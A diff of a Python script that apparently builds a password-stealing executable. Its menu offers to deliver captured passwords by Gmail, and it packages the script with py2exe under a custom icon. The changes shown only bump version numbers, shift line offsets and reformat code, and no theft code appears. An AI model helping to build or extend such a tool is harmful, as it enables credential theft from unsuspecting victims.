@@ -21,7 +21,7 @@ from win32con import MB_OKCANCEL
 
 __author__ = "Mario Nascimento"
 __license__ = "GPL"
-__version__ = "4.0.0"
+__version__ = "3.9.9"
 __maintainer__ = "Mario Nascimento"
 __email__ = "marionascimento@itsec.us"
 __status__ = "Development"
@@ -32,13 +32,13 @@ error = "0"
 email = ""
 pwd = ""
 mailto = ""
-serverlineStart = 211
-serverlineStop = 319
+serverlineStart = 212
+serverlineStop = 320
 
 while loop:
     os.system("cls")
     print(
-        """You are using V3.1.2\n
+        f"""You are using V{__version__}\n
     Choose how you want the passwords delivered\n
     (1) - [Buggy atm] via email (only Gmail supported, example@gmail.com.
         (Make sure you turn on 'allow less secure apps')\n
@@ -134,7 +134,8 @@ def py2crypt(filename):
                     "optimize": 2,
                 }
             },
-            console=[{"script": filename, "icon_resources": [(0, "icon.ico")]}],
+            console=[{"script": filename,
+                      "icon_resources": [(0, "icon.ico")]}],
             zipfile=None,
         )
 
